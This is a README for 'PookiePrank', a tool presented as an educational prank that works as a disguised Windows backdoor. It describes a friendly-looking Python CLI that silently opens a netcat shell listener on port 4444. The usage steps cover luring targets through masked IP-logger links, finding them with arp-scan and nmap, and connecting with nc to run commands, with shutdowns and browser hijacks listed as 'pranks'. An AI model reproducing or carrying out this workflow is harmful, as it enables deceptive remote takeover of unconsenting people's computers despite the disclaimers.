## What Is This?

**PookiePrank** is a lightweight "educational" program designed to demonstrate the importance of digital awareness through *strategic chaos*.  
It's a prank tool wrapped in charm â€” **cute on the outside, spooky on the inside**.

- Uses `netcat` for remote shell access (with full user control)
- Disguised behind a friendly-looking Python CLI
- An educational project that puts a Windows OS to vulnerability (and attacks eventually if not taken care of).
- Perfect for ethical demos, cybersecurity training, andâ€¦ *light mischief*.

---

## Features

- **Silent Netcat Backdoor:** Triggers a reverse shell silently via batch file.
- **User Distraction UI:** Friendly messages and fake interactions to lower suspicion.
- **Remote Payload Execution:** Once connected, send commands in real-time.
- **Prank Arsenal:** Shutdowns, message popups, browser hijacks, and more.
- **Educational Angle:** Reinforces the dangers of blind trust in random executables.

---

## Why?

Because **security through trauma** works.  
This tool is designed to:

- Raise awareness of how easily social engineering works.
- Show how reverse shells operate.
- Make friends laugh *and* cry.
- Be a conversation starter in any cybersecurity interview.

## Usage

1. Host the executable and `netcat` folder.
2. Send the masked download link using a shortened IP logger service.
3. Wait for the target to run the file.
4. Connect to the shell:
- **On target machine (Runs automatically with python script)**.
   ```bash
   nc64 -lvp 4444
   ```
   
- **Attacker's Machine**.
  - **For Linux**
    ```bash
    nc <ip_address_of_the_target_machine> 4444
    ```
  
  - **For Windows**
    ```bash
    nc64 <ip_address_of_the_target_machine> 4444
    ```
    
   - Windows users can download `netcat` tool from [this repository](https://github.com/int0x33/nc.exe/)
   - In Linux, the netcat comes preinstalled.

   NOTE:
   
   - You will need to know the target ip address beforehand. You can either use IP Loggers or do an `arp` scan over the local network.
   
   - If you are on a virtual machine, perform an arp scan on your host machine.
   
   - **For Windows**
     ```bash
     arp -a
     ```
     
   - **For Linux**
     ```bash
     sudo arp-scan --localnet
     ```
     
   This will list all the IP addresses in a network and we have to find our target from this which can simply be done by an nmap scan
   
   ```bash
   nmap -p 4444 <ip_address>
   ```

  If port 4444 is open on any IP address, it may be our target machine.

  Try connecting using the Netcat command â€” if itâ€™s successful, you're in.


6. Enjoy responsibly (or face karmic doom).

## Responsible Pranking Guidelines

1. No persistence (no startup or registry hacks).

2. No firewall tampering.

3. No data theft or spying.

4. Always reveal the prank eventually.

5. Use only on friends who won't yeet you into oblivion.

**This project is for educational and ethical use only.

## Future Plans

1. Add GUI launcher with meme themes

2. Auto-cancel prank if user types a secret code

3. PookieSec Dashboardâ„¢ for multi-prank coordination

4. Add dancing ASCII Rick in the terminal



## One Last Thing...

> **IMPORTANT:** For this prank to work, **you and your target must be on the same network** (e.g., college Wi-Fi, LAN party, cursed hostel internet).  
> Netcat operates over **local IP addresses** unless you're routing through public ports with port forwarding â€” which weâ€™re *not doing here* (because jail is not part of the prank).

So yeah â€” **same Wi-Fi = RickRoll access granted**.

Stay stealthy, stay sassy.

â€” *PookieSec Ops Out.*
